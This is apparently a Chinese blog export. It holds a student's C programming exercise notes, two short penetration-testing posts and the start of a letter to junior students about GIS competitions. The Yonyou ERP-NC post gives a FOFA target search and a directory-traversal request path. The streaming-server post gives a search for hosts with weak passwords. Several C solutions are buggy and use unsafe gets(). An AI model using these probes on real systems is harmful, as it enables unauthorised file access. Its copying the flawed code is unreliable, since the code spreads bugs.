twin_prime_test()\n{\n\tint count;\n\n\tfor (int i = 3; i <= 1000; i++)\n\t{\n\t\tif(twin_prime(i) && twin_prime(i+2))\n\t\t{\n\t\t\n\t\t\tprintf(\"%-3d, %3d\", i, i+2);\n\n\t\t\t//控制格式\n\t\t\tcount ++;\n\t\t\tif(count % 5 == 0)\n\t\t\t{\n\t\t\t\tprintf(\"\\n\");\n\t\t\t}\n\n\t\t}\n\n\t}\n\t\n\n}\n\n\nint main()\n{\n\ttwin_prime_test();\n}\n\n```\n\n\n\n\n\n#### 38.求回文数\n\n打印所有不超过n(取 n<256)的其平方的具有对称性质的装(也称回文数)\n\n```c\n//38.求回文数\n//打印所有不超过n(取 n<256)的其平方具有对称性质的装(也称回文数)\nvoid huiwen()\n{\n\t//http://c.biancheng.net/view/505.html\n\n\n\tint m[16], n, t, i, count=0;\n\n\tlong unsigned a,k;\n\t    printf(\"No.    number     it's square(palindrome)\\n\");\n\t\tfor (n=1; n<256; n++) //穷举n的取值范围\n\t\t{\n\t\t    k=0; t=1; a=n*n;  /*计算n的平方*/\n\t\t\tfor(i=0; a!= 0; i++) /*从低到高分解数a的每一位存于数组m[1]~m[16]*/\n\t\t\t{\n\t\t\t\tm[i] = a % 10;\n\t\t\t\ta /= 10;\n\t\t\t}\n\n\t\t\tfor(; i>0; i--)\n\t\t\t{\n\t\t\t\tk += m[i-1] * t;\n\t\t\t\tt *= 10;\n\t\t\t}\n\n\t\t\tif(k == n*n)\n            printf(\"%2d%10d%10d\\n\", ++count, n, n*n);\n\t\t}\n}\n```\n\n\n\n\n\n#### 39.判断一个五位数是否是回文数\n\n```c\nvoid is_huiwen()\n{\n\tint n;\n\tint ge, shi,bai, qian, wan;\n\tprintf(\"输入一个数：\");  // 65432\n\tscanf(\"%d\", &n);\n\twan = n /10000;\n\tqian = n /1000 %10;\n\tshi = n % 100 /10;\n\tge = n % 10;\n\tprintf(\"%d\", wan);\n\tprintf(\"%d\", qian);\n\tprintf(\"%d\", shi);\n    printf(\"%d\", ge);\n\n\tif(ge == wan && shi == bai)\n\t{\n\t\tprintf(\"%d是回文数\\n\", n);\n\t\n\t}\n\telse\n\t{\n\t    printf(\"%d不是回文数\\n\", n);\n\t\n\t}\n}\n\n```\n\n\n\n#### 40.求100以内的所有勾股数。\n\n所谓勾股数,是指能够构成直角三角形三条边的三个正整数（a, b. c).\n\n\n\n采用穷举法求解时，最容易想到的一种方法是利用3个循环语句分别控制变最a、b、c的取值范围，第1层控制变量a，取值范围是1〜100。在a值确定的情况下再确定b值，即第2层控制变量b，为了避免结果有重复现象，b的取值范围是a+1〜100。a、b的值已确定，利用穷举法在b+1〜100范围内一个一个的去比较，看当前c值是否满足条件 a2 + b2 = c2，若满足，则输出当前a、b、c的值，否则继续寻找。\n\n但是上述算法的效率比较低，根据 a2 + b2 = c2 这个条件，在a、b值确定的情况下，没必要再利用循环一个一个去寻找c值。若a、b、c是一组勾股数，则 a2 + b2 的平方根一定等于c，c的平方应该等于a、b的平方和，所以可将的平方根赋给c，再判断c的平方是否等于。根据“勾股数”定义将变量定义为整型，a2 + b2 的平方根不一定为整数， 但变量c的类型为整型，将一个实数赋给一个整型变量时，可将实数强制转换为整型（舍弃小数点之后的部分）然后再赋值，这种情况下得到的c的平方与原来的的值肯定不相等，所以可利用这一条件进行判断。\n\n```c\nvoid gougu()\n{\n\tint a, b, c, count=0;\n    printf(\"100以内的勾股数有：\\n\");\n\tfor(a=1; a<=100; a++)\n\t{\n\t\tfor(b=a+1; b<=100; b++)\n\t\t{\n\t\t\tc = (int)sqrt((double)(a*a + b*b));  //求c的值\n\t\t\tif(c*c==a*a+b*b && a+b>c && a+c>b && b+c>a && c<=100)  /*判断c的平方是否等于a2+b2*/\n\t\t\t{\n\t\t\t\tprintf(\"%4d %4d %4d\", a,b,c);\n\t\t\t\tcount++;\n\t\t\t\tif (count % 5 == 0) //每五组就换行\n\t\t\t\t\tprintf(\"\\n\");\n\t\t\t}\n\t\t}\t\n\t}\n}\n\n```\n\n\n\n#### 41.输入一个字符串,判断其是否为回文\n\n所谓**回文字符串**,是指从左到右读和从右到左读完全相同的字符串。\n\n```c\n//从中间为界限，前后对应位置比较，如果相同，则为回文\n  \nvoid str_huiwen()\n{\n\tchar s[100];  // 存放输入的字符串 \n    int i, j, n;\n    printf(\"输入字符串：\");\n    gets(s);\n    \n    n=strlen(s);\n    for(i=0,j=n-1;i<j;i++,j--)\n\t{\n\t\tif(s[i]!=s[j]) break;\n\t}\n    \n    if(i>=j)\n        printf(\"是回文串\\n\");\n    else\n        printf(\"不是回文串\\n\");\n}\n    \n```\n\n\n\n#### 42删除字符串中间的*号\n\n现在有一串字符需要输入，规定输入的字符串中只包含字母和`*`号。请编写程序，实现以下功能:除了字符串前后的`*`号之外,将串中其他的`*`号全部删除。\n例如，假设输入的字符串为·\\*\\*\\*A\\*BC\\*DEF\\*G\\*\\*\\*\\*\\*\\*，删除串中的*号后，字符串变为\\*\\*\\*ABCDEFG\\*\\*\\*\\*\\*\\*\n\n```c\n//可以设两个变量i j让i从字符串左边起往右移动，到第一个不为*的位置记下此时i的值，设j从字符串右边往左移动，到第一个不为星号的位置记下此时j的值.\n//再设一个临时变量k,从i到j移动，遇到星号将其置0处理，然后输出即可\n\n\nvoid delete_xing()\n{\n\tchar c[100] = {0};\n\tscanf(\"%s\", c);\n\tint len = strlen(c), i, j;\n\n\tfor (i = 0; i < len; i++)\n\t{\n\t\tif(c[i] != '*' && c[i-1] == '*')\n\t\t\tbreak;  //i从串左边起往右移动，第一个不为*的位置记下此时i的值\n\t}\n\n\tfor (j = len-1; j >= 0; j--)\n\t{\n\t\t//j从字符串右边往左移动，到第一个不为星号的位置记下此时j的值\n\t\tif(c[j] != '*' && c[j+1] == '*')\n\t\t    break;  //第一个不为*的位置记下此时i的值\n\t}\n\n\t// 再设一个临时变量k,从i到j移动，遇到星号将其置0处理，然后输出即可\n\tfor (int k = i; k <=j; k++)\n\t{\n\t\tif(c[k] == '*')\n\t\t\tc[k] = '0';\n\t}\n\n\t// 输出\n\tfor(int k=0; k<len; k++)\n\t\tif(c[k]!='0')\n\t\t\tprintf(\"%c\",c[k]);\n\n\n}\n\n\n```\n\n\n\n#### 43.实现函数strlen\n\nC库函数strlen可以求string所指字符串串长，其函数定义:`int strlen (char *string)`.请根据上述函数定义,实现此函数。\n\n```c\nint strlen(char *string)\n{\n\tint length=0;\n\twhile (*string++ != '\\0')\n\t{\n\t\tlength++;\n\t}\n\treturn length;\n\n}\n\n//测试函数\nvoid strlen_test()\n{\n\tchar s[10] = \"\\0\";\n\tint len;\n\tprintf(\"请输入字符串：\");\n\n\tgets(s);\n\tprintf(\"%s\\n\", s);\n\n\tlen = strlen(s);\n\n\tprintf(\"%d\\n\", len);\n\n}\n\n```\n\n\n\n\n\n#### 44.实现函数atoi\n\nC库函数atoi可以实现字符串向整数的转换，其函数定义:`int atoi( char *s)`，请根据上述函数定义,实现此语数。\n\n```c\n//考点：字符串转换为数字时，对相关ASCII码的理解。\n// a - '0'\n#include <stdio.h>\n#include <ctype.h>\n\nint atoi(char *s)\n{\n\tint num_val, flag, i;\n\n\tif(s == NULL)\n\t{\n\t\treturn 0;\n\t}\n\n\tfor (i = 0; i < isspace(i); i++) //直到空格前一直循环\n\t{\n\t\tflag = (s[i]=='-')?-1:1;\n\n\t}\n\n\tif(s[i] == '-' || s[i] == '+') //跳过运算符\n\t\ti++;\n\n\t//从数字开始计算\n\tfor(num_val=0; isdigit(s[i]); i++)\n\t\tnum_val = 10*num_val +(s[i] - '0');  //将数字字符转换成整形数字\n\n\n\n\treturn num_val;\n\t\n}\n\nvoid atoi_test()\n{\n\tchar s[10] = \"\\0\";\n\tint len;\n\tprintf(\"请输入整数形式的字符串：\"); // -5678\n\tscanf(\"%s\", s);\n\t\n\tprintf(\"整数为: %d\\n\", atoi(s));\n\n\n}\n\n```\n\n\n\n\n\n#### 45.实现函数itoa\n\nC库函数itoa可以实现整数字向符串的转换,其函数定义:`void itoa (int n, char *s)`，请根据上述函数定义,实现此函数。\n\n```c\n//通过把整数的各位上的数字加“0”转换成char类型并存到字符数组中。但是要注意，需要采用字符串逆序的方法\n// a + '0'\n\n\n//45.实现函数itoa\nvoid itoa(int num, char *s)\n{\n\tint i,j,sign;\n\t//sign用来记录符号\n\tif((sign=num) < 0) \n\t\tnum = -num; //如果为负数，乘以-1来变为正数\n\n\ti=0;\n\tdo{\n\t\t// 如： '5678'\n\t\ts[i++] = num%10 + '0';  //取下一个数字\n\n\t}while((num/=10) > 0);  //删除该数字     5678 --> 567 --> 56 --> 5\n\t\n\tif(sign < 0)\n\t\ts[i++] = '-';  //如果为负数，把减号放到数组末尾\n\ts[i] = '\\0';\n\n\t//因为生成的数字是逆序的，所以要逆序输出\n\tfor (j=i; j>=0; i=j--)\n\t{\n\t\tprintf(\"%c\", s[j]);\n\t}\n\n}\n\nvoid itoa_test()\n{\n\tint num;\n\tchar s[100];\n\tprintf(\"Input num:\");\n\n\tscanf(\"%d\",&num);\n\tprintf(\"the string : \\n\");\n\n\titoa (num,s);\n}\n```\n\n\n\n#### 46.实现函数 strcat\n\nC库函数 strcat可以实现两字符串的连接,其函数定义:`char *strcat (char *strDes,const char  *strSrc)`.请根据上述函数定义,实现此函数。\n\n```c\nchar *strcat (char *strDes,const char  *strSrc)\n{\n\tchar *tmp = strDes; //赋值首地址，为了最后方便返回\n\n\twhile (*strDes)\n\t\t*strDes ++;  //将指针移动到最后\n    \n\twhile ((*strDes++ = *strSrc++) != '\\0');\n\n\treturn tmp;\n}\n\n\nvoid main()\n{\n    char src[10] = \"world\";\n    char dest[100] = \"hello \";\n\n\tchar* str3 = strcat(dest, src);\n\tprintf(\"%s\", str3);  // hello world\n}\n```\n\n\n\n#### 47.实现函数strncat\n\nC库函数strncat可以实现把 **strSrc所指字符串的前n个字符**添加到strDes所指字符串结尾处,其函数定义;`char *strncat(char *strDes,const char *strSrc, Int count)`，请根据上述函数定义,实现此函数。\n\n```c\nchar *strncat(char *strDes,const char *strSrc, int count)\n{\n\tchar *tmp = strDes; //赋值首地址，为了最后方便返回\n\n\twhile (*strDes)\n\t\t*strDes ++;  //现将指针移动到最后\n\n\t// 把src所指字符串的前n个字符添加到dest结尾处(覆盖dest结尾处的'\\0')\n\twhile (count-- && (*strDes++ = *strSrc++));\n\t\n    // 并添加'\\0'\n\t*strDes = '\\0';\n\n\treturn tmp;\n}\n\nvoid main()\n{\n    char src[10] = \"world\";\n    char dest[100] = \"hello \";\n\n\tchar* str3 = strncat(dest, src, 3);\n\tprintf(\"%s\", str3);\n}\n```\n\n\n\n#### 48.实现函数strcpy\n\nC库函数strcpy可以实现两字符串的复制,其函数定义:`char *strcpy (char *strDes, const char *strSrc)`.请根据上述函数定义,实现此函效。\n\n```c\nchar *strcpy (char *strDes, const char *strSrc)\n{\n\t\n    char *p=NULL;\n    if(strDes == NULL || strSrc == NULL)\n    {\n        return NULL;\n\t}\n\n\tp = strDes;\n\n\twhile((*strDes++ = *strSrc++) != '\\0');\t\n\n\treturn p;\n}\n\n\n\nvoid main()\n{\n    char src[10] = \"world\";\n\tchar dest[100] = {0};\n\n\tchar* str3 = strcpy(dest, src);\n\tprintf(\"%s\", str3);\n}\n\n```\n\n\n\n#### 49.实现函数strncpy\n\nC库函数strncpy可以实现把strsrc所指字符串的前n个字符复制到strDes所指字符串,其函数定义:`char *strncpy(char *strDes, const char *strSrc, int count)`，请根据上述函数定义,实现此函数。\n\n```c\nchar *strncpy(char *strDes, const char *strSrc, int count)\n{\n    char *p=NULL;\n    if(strDes == NULL || strSrc == NULL) //判断是否为空（作为一个程序员最基本的严谨性）\n    {\n        return NULL;\n\t}\n\n\tp = strDes;\n\n\twhile(count--)\n\t{\n\t\t*strDes++ = *strSrc++;\n\t}\n\n\t//如果目标字符串不是以\\0结尾，就自己添加一个\n\tif (*(strDes) != '\\0')\n\t\t*(strDes + 1) = '\\0';\n\n\treturn p;\n\n}\n\n\nvoid main()\n{\n    char src[10] = \"world\";\n\tchar dest[10] = {0};\n\n\tchar * str3 = strncpy(dest, src, 4);\n\tprintf(\"%s\\n\", str3);\n}\n\n```\n\n\n\n#### 50.实现函数strcmp\n\nC库函数strcmp可以实现两字符串的比较，其函数定义:`int strcmp(const char *s, const char *t)`,请根据上述函数定义,实现此函数。\n\n```c\n//低级版本\nint strcmp(const char *s, const char *t)\n{\n\twhile (*s !='\\0' || *t != '\\0')\n\t{\n\t\tif(*s > *t) return 1;\n\t\telse if(*s < *t) return -1;\n\n\t\t*s++;\n\t\t*t++;\n\t}\n\treturn 0;\n}\n\n//改良版本\nint strcmp(const char *s, const char *t)\n{\n    if(*s == NULL || *t == NULL)\n    {\n        return NULL;\n\t}\n\n\twhile(*s && *t && (*s == *t))\n\t{\n\t\ts++;\n\t\tt++;\n\t}\n\treturn *s - *t;\n}\n\n\n\n\nvoid main()\n{\n    char src[10] = \"world\";\n\tchar dest[10] = \"worla\";\n\n\tint flag = strcmp(dest, src);\n\tprintf(\"%d\\n\", flag);\n}\n\n```\n\n\n\n#### 51.实现函数strncmp\n\nC库语数strncmp 可以实现s所指字符串与t所指字符串的最多前n个字符的比较,其函数定义: `int strncmp(const char *s, const char *t, int count)`，请根据上述函数定义,实现此函数,\n\n```c\nint strncmp(const char *s, const char *t, int count)\n{\n    if(*s == NULL || *t == NULL)\n    {\n        return NULL;\n\t}\n\t\n\t//还需要判断count是否超出了两个str的长度\n\n\n\twhile (count-- && (*s == *t))\n\t{\n\t\ts++;\n\t\tt++;\n\t}\n\treturn *s - *t;\n\n}\n\n\nvoid main()\n{\n    char src[10] = \"world\";\n\tchar dest[10] = \"wzrlt\";\n\n\tint flag = strncmp(dest, src, 3);\n\tprintf(\"%d\\n\", flag);\n}\n```\n\n\n\n#### 52.利用梯形法计算定积分 \n\n其中,f(x)=x^3+3x^2-x+2.\n\n**思想：**为求出总面积，先将区间[a, b]分成n小块，每一块的图形近似于一个小梯形。用梯形面积代替该小块图形的面积，然后进行累计，就能够得到曲线图形的近似面积。\n\n```cpp\n???不会不会\n    \n#include <stdio.h>\n#include <math.h>\n\nfloat collect(float s,float t,int m,float (*p)(float x));\nfloat fun1(float x);\nfloat fun2(float x);\nfloat fun3(float x);\nfloat fun4(float x);\n\nint main()\n{\n    int n,flag;\n    float a,b,v=0.0;\n    printf(\"Input the count range(from A to B)and the number of sections.\\n\");\n    scanf(\"%f%f%d\",&a,&b,&n);\n    printf(\"Enter your choice：'1' for fun1,'2' for fun2,'3' for fun3,'4' for fun4==>\");\n    scanf(\"%d\",&flag);\n    if(flag==1)\n        v=collect(a,b,n,fun1);\n    else if(flag==2)\n        v=collect(a,b,n,fun2);\n    else if(flag==3)\n        v=collect(a,b,n,fun3);\n    else\n        v=collect(a,b,n,fun4);\n    printf(\"v=%f\\n\",v);\n    return 0;\n}\n\nfloat collect(float s,float t,int n,float (*p)(float x))\n{\n    int i;\n    float f,h,x,y1,y2,area;\n    f=0.0;\n    h=(t-s)/n;\n    x=s;\n    y1=(*p)(x);\n    for(i=1;i<=n;i++)\n    {\n        x=x+h;\n        y2=(*p)(x);\n        area=(y1+y2)*h/2;\n        y1=y2;\n        f=f+area;\n    }\n    return (f);\n}\n\nfloat fun1(float x)\n{\n    float fx;\n    fx=x*x-2.0*x+2.0;\n    return(fx);\n}\n\nfloat fun2(float x)\n{\n    float fx;\n    fx=x*x*x+3.0*x*x-x+2.0;\n    return(fx);\n}\n\nfloat fun3 (float x)\n{\n    float fx;\n    fx=x*sqrt(1+cos(2*x));\n    return(fx);\n}\n\nfloat fun4(float x)\n{\n    float fx;\n    fx=1/(1.0+x*x);\n    return(fx);\n}\n```\n\n\n\n\n\n#### 53.编程计算空间上任意两点之间的距离\n\n```c\n#include <math.h>\n\n// 两个点，要定义两个结构体\nstruct Point\n{\n\tfloat x;\n\tfloat y;\n\tfloat z;\n\n};\nfloat length_point(struct Point p1, struct Point p2)\n{\n\tfloat x, y, z, len;\n\tx = fabs(p1.x - p2.x);\n\ty = fabs(p1.y - p2.y);\n\tz = fabs(p1.z - p2.z);\n\n\tlen = sqrt(x*x + y*y + z*z);\n\n\treturn len;\n}\n\n//测试函数\nvoid length_point_test()\n{\n\tstruct Point p1, p2;\n\tprintf(\"请输入point1的: x,y,z: \");\n\tscanf(\"%f, %f, %f\", &p1.x, &p1.y, &p1.z);\n\n\tprintf(\"请输入point2的: x,y,z: \");\n\tscanf(\"%f, %f, %f\", &p2.x, &p2.y, &p2.z);\n\n\tprintf(\"两点距离：%f \", length_point(p1, p2));\n\n}\n```\n\n\n\n\n\n\n\n#### 54.日期运算问题\n\n定义一个表示日期的结构体类型，再分别定义函数完成下列功能(两个日期由键盘输入):\n\n计算某一天是对应年的第几天,\n\n这一年一共多少天,\n\n计算两个日期之间相隔的天数。\n\n```c\ntypedef struct \n{\n\tint year, month, day;\n}Date;\n\n//1.计算某年的天数\nint yearday(int year)\n{\n\tint yday;\n\tif(year%=4==0 && year%100 || year == 0)\n\t\tyday = 365;\n\telse\n\t\tyday = 365;\n\n\treturn yday;\n}\n\n//计算某年二月份天数\nint monthday(int year)\n{\n\tint mday;\n\tif(year%=4==0 && year%100 || year == 0)\n\t\tmday = 29;\n\telse\n\t\tmday = 28;\n\n\treturn mday;\n}\n\n//2.计算某一天日期是对应年的第几天\nint dayofyear(Date d)\n{\n\tint total = 0;\n\tint months[13] ={0,31,28,30,31,30,31,31,30,31,30,31};\n\tmonths[2] = monthday(d.year); //判断二月份的天数\n\tfor (int i =0; i< d.month; i++)\n\t{\n\t\ttotal += months[i];\n\t}\n\ttotal = total + d.day;\n\n\treturn total;\n}\n\n\n//比较两个日期之间大小\nint cmpdate(Date d, Date s)\n{\n\tint result;\n\tif(d.year == s.year)\n\t{\n\t\tif(d.month == d.month)\n\t\t{\n\t\t\tif(d.day == d.day)\n\t\t\t\tresult = 0;\n\t\t\telse\n\t\t\t\tresult = d.day - s.day;\n\t\t}\n\t\telse\n\t\t\tresult = d.month - s.month;\n\t}\n\telse\n\t\tresult = d.year - s.year;\n\n\treturn result;\n}\n\n// 3.计算两个日期之间相隔的天数\nint interday(Date d, Date s)\n{\n\tint result, te, ts, total;\n\tint year, start, end, day;\n\tresult = cmpdate(d, s); //先比较大小\n\tif(result>0)  //如果第一个日期大\n\t{\n\t\tstart = s.year;\n\t\tend = d.year;\n\t\tte = dayofyear(d);\n\t\tts = dayofyear(s);\n\t}\n\telse if(result <0)\n\t{\n\t\tstart = d.year;\n\t\tend = s.year;\n\t\tte = dayofyear(s);\n\t\tts = dayofyear(d);\n\t\n\t}\n\telse\n\t{\n\t\treturn 0;\n\t}\n\n\tif(start == end)   //如果是同一年\n\t\treturn abs(te - ts);\n\telse               //如果不是同一年\n\t{\n\t\ttotal = 0;\n\t\tfor (int i = start; i <= end; i++)\n\t\t{\n\t\t\tday = yearday(i);\n\t\t\tif(i==start)\n\t\t\t\ttotal = total + day -ts;\n\n\t\t\telse if(i==end)\n\t\t\t\ttotal = total + te;\n\t\t\telse\n\t\t\t\ttotal = total+day;\n\t\t}\n\t\n\t}\n\n\treturn total;\n\n}\n\n\n\nvoid cal_date()\n{\n\tDate d1, d2;\n\tint y, n;\n\tprintf(\"输入日期: \\n\");\n\tscanf(\"%d%d%d\", &d1.year, &d1.month, &d1.day);\n\tscanf(\"%d%d%d\", &d2.year, &d2.month, &d2.day);\n\ty = yearday(d1.year);\n\tn = dayofyear(d1);\n\tprintf(\"%d days  %d\\n\", d1.year, y);\n\tprintf(\"%d-%d-%d is the % day\", d1.year, d1.month, d1.day, n);\n\n\tn = interday(d1, d2);\n\tprintf(\"%d-%d-%d 和 %d-%d-%d 相差  %d\", d1.year, d1.month, d1.day,  d2.year, d2.month, d2.day);\n\n\tprintf(\"%d 天\\n\", n);\n}\n\n\n```\n\n\n\n#### 55.统计各字符个数\n\n输入一行字符，分别统计出其中英文字母、空格、数字和其它字符的个数。\n\n```c\nvoid count_char()\n{\n\tchar c;\n\tint letter=0, space=0, other=0, num=0;\n\n\tprintf(\"请输入字符串: \");\n\twhile ((c=getchar()) !='\\n')\n\t{\n\t\tif(c == ' ')\n\t\t\tspace ++;\n\t\telse if((c <= 'Z' && c >='A') || (c <= 'z' && c >='a'))\n\t\t\tletter ++;\n\t\telse if(c <= '9' && c >='0')\n\t\t\tnum ++;\n\t\telse\n\t\t\tother ++;\n\t}\n\n\tprintf(\"空格:%d, 字母:%d, 数字:%d, 其他:%d\", space, letter, num, other);\n\n}\n```\n\n\n\n\n\n#### 56.统计文件的字符数、单词数以及总行数\n\n统计包括:\n每行的**字符数**和**单词数**\n**文件**的**总字符数**、**总单词数**以及**总行数**\n\n```c\n//http://c.biancheng.net/cpp/html/2823.html\nint *getCharNum(char *filename,int  *totalNum)\n{\n\tFILE *fp; \n\tchar buffer[1003]; //缓冲区，存储读取到的每行的内容\n\tint bufferLen;   //缓冲区存储内容的长度\n\tint i;\n\tchar c; ///读取到的字符\n\tint isLastBlank = 1; //上一个字符是否是空格\n\tint charNum = 0;  //当前行的字符数\n\tint wordNum = 0; //当前行的单词数\n\n\n\tif((fp=fopen(filename, \"rb\")) == NULL)\n\t{\n\t\tprintf(\"打开文件错误!!!\");\n\t\treturn NULL;\n\t\n\t}\n\n\t//统计\n\tprintf(\"line    words    chars\\n\");\n\t//m每次读取一行数据，保存到buffer，每行最多能有1000个字符\n\twhile ((fgets(buffer, 1003, fp)) != NULL)\n\t{\n\t\tbufferLen = strlen(buffer);\n\t\t//遍历缓冲区的内容\n\t\tfor (i = 0; i < bufferLen; i++)\n\t\t{\n\t\t\tc = buffer[i];  //c是当前位置的字符\n\t\t\tif(c == ' ' || c == '\\t') //遇到空格\n\t\t\t{\n\t\t\t\t!isLastBlank && wordNum;   //如果上一个字符不是空格，那么单词数+1\n\t\t\t\tisLastBlank = 1;\n\t\t\t}else if(c != '\\n' || c != '\\r')  // 忽略换行 \n\t\t\t{\n\t\t\t\tcharNum++; //如果挤不上换行符也不是空格，字符数+1\n\t\t\t\tisLastBlank = 0;\n\t\t\t}\n\t\t}\n\t\t!isLastBlank && wordNum++;  //如果最后一个字符不是空格，单词数+1\n\t\tisLastBlank = 1; //每次换行重置为1\n\t\t//一行结束，计算总单词数、总字符数、总行数\n\t\ttotalNum[0]++;  //总行数\n\t\ttotalNum[1] += charNum; //总字符数\n\t\ttotalNum[2] += wordNum; //总单词数\n\n\t\tprintf(\"%-7d%-7d%-7d\\n\", totalNum[0], wordNum, charNum);\n\t\t//置0，重新进入下一行\n\t\tcharNum = 0;\n\t\twordNum = 0;\n\t}\n\t\n\treturn totalNum;\n}\n\nvoid count_all_test()\n{\n\tchar filename[20];\n\tint totalNum[3] = {0,0,0}; //totalNum[0] 总行数， totalNum[1] 总字符数, totalNum[2] 总单词数\n\tprintf(\"输入文件名: \");\n\tscanf(\"%s\", filename);\n\n\tif(getCharNum(filename, totalNum))\n\t{\n\t\tprintf(\"%d行，%d个字符, %d个单词 \\n\", totalNum[0], totalNum[2], totalNum[1]);\n\t\n\t}else\n\t{\n\t\tprintf(\"错误\");\n\t}\n\n}\n```\n\n\n\n#### 57.统计英文字母、空格、数字和其它字符的数目\n\n输入一行字符,分别统计出其中英文字母、空格、数字和其它字符的个数。\n\n```c\nvoid count_char()\n{\n\tchar c;\n\tint letter=0, space=0, other=0, num=0;\n\n\tprintf(\"请输入字符串: \");\n\twhile ((c=getchar()) !='\\n')\n\t{\n\t\tif(c == ' ')\n\t\t\tspace ++;\n\t\telse if((c <= 'Z' && c >='A') || (c <= 'z' && c >='a'))\n\t\t\tletter ++;\n\t\telse if(c <= '9' && c >='0')\n\t\t\tnum ++;\n\t\telse\n\t\t\tother ++;\n\t}\n\n\tprintf(\"空格:%d, 字母:%d, 数字:%d, 其他:%d\", space, letter, num, other);\n\n}\n```\n\n\n\n#### 58.大小写转换并输入到文件保存\n\n从键盘输入一个字符串,将小写字母全部转换成大写字母，大写字母全部转换成小写字母，然后输出到一个磁盘文件“test”中保存。输入的字符串以`!`结束。\n\n```c\nvoid save_char()\n{\n\tFILE *fp;\n\tchar str[100], filename[10];\n\tint ii;\n\n\tif((fp = fopen(\"D:\\\\2.txt\", \"w+\")) == NULL)\n\t{\n\t\tprintf(\"打开文件错误\");\n\t\texit(0);\n\t\n\t}\n\n\tprintf(\"输入字符串: \");\n\tgets(str);\n\n\twhile (str[ii] != '!')\n\t{\n\t\tif(str[ii] >= 'a' && str[ii] <='z')\n\t\t\tstr[ii] = str[ii] + 'A'-'a';\n\t\tif(str[ii] >= 'A' && str[ii] <='Z')\n\t\t    str[ii] = str[ii] + 'a'-'A';\n\n\t\tfputc(str[ii], fp);\n\t\tii++;\n\t}\n\n\n\tfclose(fp);\n\n\n}\n\n\n```\n\n\n\n#### 59.利用递归方法求5!\n\nf(n) = n*f(n-1)\n\n```c\nint get_5sum(int n)\n{\n\tif(n==1)\n\t\treturn 1;\n\telse\n\t{\n\t\treturn n * get_5sum(n-1);\n\t}\n}\n\n\nvoid main()\n{\n\tprintf(\"5!= %d\", get_5sum(5));\n}\n\n```\n\n\n\n#### 60.输入三个字符串,将其按照从小到大排序并输出\n\n```c\nvoid swap(char *p1, char *p2)\n{\n\tchar p[20];  // 交换tmp变量\n\tstrcpy(p, p1);\n\tstrcpy(p1, p2);\n\tstrcpy(p2, p);\n\n}\n\nvoid sort_3str()\n{\n\tchar s1[20], s2[20], s3[2];\n\tprintf(\"输入第1个字符串: \");\n\tscanf(\"%s\", s1);\n\n\tprintf(\"输入第2个字符串: \");\n\tscanf(\"%s\", s2);\n\n\tprintf(\"输入第3个字符串: \");\n\tscanf(\"%s\", s3);\n\t\n\n\t//开始比较\n\tif(strcmp(s1,s2) >0)  //如果S1>S2,则交换\n\t\tswap(s1, s2);\n\tif(strcmp(s1,s2) >0)   //如果s1>s3,则交换\n\t\tswap(s1, s3);\n\tif(strcmp(s2,s3) >0)   //如果s2>s3,则交换\n\t\tswap(s2, s3);\n\n\tprintf(\"排序后的字符串: \\n\");\n\tprintf(\"%s \\n %s \\n %s\", s1, s2, s3);\n\n}\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["编程刷题"],"categories":["C语言"]},{"title":"流媒体管理服务器存在弱⼝令漏洞","url":"%2Fposts%2F20730%2F","content":"\n\n\nfofa语句：\n\n```bash\ntitle=\"流媒体管理服务器\"\n```\n\n![](http://image.xpshuai.cn/%E6%B5%81%E5%AA%92%E4%BD%93%E5%BC%B1%E5%8F%A3%E4%BB%A4.jpg)\n\n\n\n登录：\n\n![](http://image.xpshuai.cn/%E6%B5%81%E5%AA%92%E4%BD%93%E7%99%BB%E5%BD%95.jpg)\n\n\n\n![](http://image.xpshuai.cn/%E6%B5%81%E5%AA%92%E4%BD%931.jpg)","tags":["弱口令"],"categories":["渗透测试"]},{"title":"⽤友ERP-NC ⽬录遍历漏洞","url":"%2Fposts%2F55106%2F","content":"\n### 漏洞描述\n\n⽤友ERP-NC 存在⽬录遍历漏洞，攻击者可以通过⽬录遍历获取敏感⽂件信息 \n\n\n\n### fofa语法\n\n```bash\napp=\"⽤友-UFIDA-NC\"\n```\n\n![](http://image.xpshuai.cn/%E7%94%A8%E5%8F%8Bfofa.jpg)\n\n\n\n### 复现\n\nPOC:\n\n```bash\n /NCFindWeb?service=IPreAlertConfigService&filename=\n```\n\n![](http://image.xpshuai.cn/%E7%94%A8%E5%8F%8B%E4%BA%BApoc1.jpg)\n\n查看文件（这里以admin.jsp为例）：\n\n![](http://image.xpshuai.cn/%E7%94%A8%E5%8F%8Bpoc.jpg)","tags":["⽤友ERP-NC"],"categories":["渗透测试"]},{"title":"致学弟学妹","url":"%2Fposts%2F33070%2F","content":"\n\n\n各位学弟学妹好，我是2016级地信的薛彭帅。本来是打算录个小视频的，但由于工作原因没有实现，索性就用简单的文字来表达吧。\n\n听说老师们组织你们年轻一届的学生参加行业内的各种比赛，听到之后非常羡慕，都有点想回去再上一次学了:laughing:。由于我们当时参加的比赛较少，就参加过一次比赛 -- 第七届全国大学生GIS应用技能大赛，而且也只是拿了个二等奖，SO我的经验可能也相对其他竞赛经历丰富学长学姐较少一些，但因为我们那一届之后各种比赛和活动在咱专业也举办的火热起来(年纪比较大了哈哈)，所以我也就简单分享一下我的经验吧。你们觉得有用的部分，可以借鉴一下；觉得没用的部分，就当看白话小说放松一下哈)。\n\n\n\n### 参赛好处\n\n首先专业领域内的比赛，对于个人的发展肯定是有诸多好处的。首先你可以通过比赛提高自己的专业素养，掌握更多的知识；其次可以培养你的团队感，尽管各自有各自的想法，甚至会因为意见不同而吵起来，但这最终都是为了同一个目的--比赛取得更好的结果，这反而会更加增强你们的团队凝聚力（但是别真打起来哈:joy:）；再次多参加比赛呢，你们还能结识其他高校志同道合的朋友，还能见识到行业内的领军人物(光听着就很cool呀)，对你以后深入行业是个不可多得的宝贵经历。\n\n\n\n### 经验分享\n\n1. **心态**。心态是最重要的，如果平时练习都不错，一道比赛的“大场面”慌了，遇到点小问题心态就崩了，思绪就乱了，那还怎么拿名次？\n2. 如果是团队参加的比赛，一定要注重**分工**，找到每个人所擅长的东西来分工是第一原则。同时也要**团结协作**，你们是一个整体，只有你们一起才能完成比赛，单靠个人单打独斗是不行的。\n3. 对于GIS，不管是编程题和制图题，只有一个方法，**下来多练**！\n4. 